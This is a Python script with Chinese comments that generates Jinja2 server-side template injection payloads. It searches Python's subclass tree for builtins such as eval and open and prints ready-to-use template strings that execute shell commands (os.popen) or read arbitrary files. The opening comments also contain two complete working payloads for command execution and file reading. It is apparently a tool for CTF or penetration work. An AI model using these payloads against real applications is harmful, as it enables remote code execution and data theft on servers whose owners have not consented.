from flask import Flask
from jinja2 import Template

# 此处只是找到了对应函数，实际上已经差不多了。
# 不过要利用的话，还是得加上参数来进行命令执行，文件读取等操作

# 直接将下面pyload中的参数贴上去即可
# #命令执行：
# {% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('id').read()") }}{% endif %}{% endfor %}
#文件操作
# {% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('filename', 'r').read() }}{% endif %}{% endfor %}




searchList = ['__init__', "__new__", '__del__', '__repr__', '__str__', '__bytes__', '__format__', '__lt__', '__le__', '__eq__', '__ne__', '__gt__', '__ge__', '__hash__', '__bool__', '__getattr__', '__getattribute__', '__setattr__', '__dir__', '__delattr__', '__get__', '__set__', '__delete__', '__call__', "__instancecheck__", '__subclasscheck__', '__len__', '__length_hint__', '__missing__','__getitem__', '__setitem__', '__iter__','__delitem__', '__reversed__', '__contains__', '__add__', '__sub__','__mul__']
need_list = ['exec','open','eval']

# for i in enumerate(''.__class__.__base__.__subclasses__()):
#     print(i)
number = 0
question = int(input("是否直接输出结果？[1|0]"))
for i in ''.__class__.__base__.__subclasses__():
    # print(i)
    for sear in searchList:
        if hasattr(i,sear):
            # print(eval('str(i.'+str(need)+')'))
            if eval('str(i.'+str(sear)+')[1:9]') == 'function':
                for need in need_list:
                    if eval('"'+need+'" in i.'+sear+'.__globals__["__builtins__"].keys()'):
                        
                        if not question :
                            print(i.__name__,":",sear,need)
                        else:
                            if need == 'open':
                                print(r"{% for x in ''.__class__.__base__.__subclasses__() %}"+r"{% if x.__name__=='"+i.__name__+"' %}"+r"{{ x.__init__.__globals__['__builtins__']."+need+r'("目标文件").read() }}'+r"{% endif %}{% endfor %}")
                            elif need == 'eval':
                                print(r"{% for x in ''.__class__.__base__.__subclasses__() %}"+r"{% if x.__name__=='"+i.__name__+"' %}"+r"{{ x.__init__.__globals__['__builtins__']."+need+'("__import__(\'os\').popen(\'id\').read()") '+r'}}'+r"{% endif %}{% endfor %}")
                

                            number += 1
print("payload numbers is ：",number)






















